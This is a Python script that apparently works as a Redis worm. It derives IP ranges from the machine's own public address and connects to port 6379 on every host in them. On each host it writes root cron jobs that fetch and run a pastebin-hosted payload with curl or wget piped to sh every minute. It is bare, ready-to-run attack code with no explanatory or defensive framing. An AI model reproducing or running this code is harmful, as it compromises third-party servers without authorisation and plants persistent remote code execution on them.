#! /usr/bin/env python
#coding: utf-8

import threading
import socket
from re import findall
import httplib

IP_LIST = []

class scanner(threading.Thread):
    tlist = []
    maxthreads = 20
    evnt = threading.Event()
    lck = threading.Lock()

    def __init__(self,host):
        threading.Thread.__init__(self)
        self.host = host
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.host, 6379))
            s.send('set backup1 "\\n\\n\\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\\n\\n\\n"\r\n')
            s.send('set backup2 "\\n\\n\\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\\n\\n\\n"\r\n')
            s.send('config set dir /var/spool/cron\r\n')
            s.send('config set dbfilename root\r\n')
            s.send('save\r\n')
            s.close()
        except Exception as e:
            pass
        scanner.lck.acquire()
        scanner.tlist.remove(self)
        if len(scanner.tlist) < scanner.maxthreads:
            scanner.evnt.set()
            scanner.evnt.clear()
        scanner.lck.release()

    def newthread(host):
        scanner.lck.acquire()
        sc = scanner(host)
        scanner.tlist.append(sc)
        scanner.lck.release()
        sc.start()

    newthread = staticmethod(newthread)

def get_ip_list():
    try:
        url = 'ident.me'
        conn = httplib.HTTPConnection(url, port=80, timeout=10)
        req = conn.request(method='GET', url='/', )
        result = conn.getresponse()
        ip2 = result.read()
        ips2 = findall(r'\d+.\d+.', ip2)[0][:-2]
        for u in range(0, 10):
            ip_list1 = (ips2 + (str(u)) +'.')
            for i in range(0, 256):
                ip_list2 = (ip_list1 + (str(i)))
                for g in range(0, 256):
                    IP_LIST.append(ip_list2 + '.' + (str(g)))
    except Exception:
        pass

def runPortscan():
    get_ip_list()
    for host in IP_LIST:
        scanner.lck.acquire()
        if len(scanner.tlist) >= scanner.maxthreads:
            scanner.lck.release()
            scanner.evnt.wait()
        else:
            scanner.lck.release()
        scanner.newthread(host)
    for t in scanner.tlist:
        t.join()

if __name__ == "__main__":
    runPortscan()


